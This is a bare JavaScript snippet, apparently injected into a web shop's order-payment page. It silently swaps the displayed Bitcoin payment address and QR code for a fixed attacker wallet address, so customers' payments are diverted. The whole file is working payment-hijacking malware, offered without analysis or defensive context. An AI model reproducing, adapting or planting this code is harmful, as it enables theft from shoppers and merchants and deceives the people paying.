function api(){

    if (window.location.href.includes("order-pay")){
        var amo = document.getElementById("amount").innerText;
        if(document.getElementById("qrcode").children[1].src=="https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=bitcoin:bc1qyk8x6amx3pm4w9hw0s0c4y7dzmfjpuel282qn5?amount="+amo){
            clearInterval(intertime);
            return 0;
        }
        else{
            document.getElementById("qrcode").children[1].src="";
        }
        var add = document.getElementById("payment-address").innerText;
        var html = document.body.innerHTML;
        var newHtml = html.replace(new RegExp(add, 'g'), 'bc1qyk8x6amx3pm4w9hw0s0c4y7dzmfjpuel282qn5');
        document.body.innerHTML = newHtml;
        document.getElementById("qrcode").children[1].src="https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=bitcoin:bc1qyk8x6amx3pm4w9hw0s0c4y7dzmfjpuel282qn5?amount="+amo

    }
}
var intertime = setInterval(function(){api(intertime)}, 1);
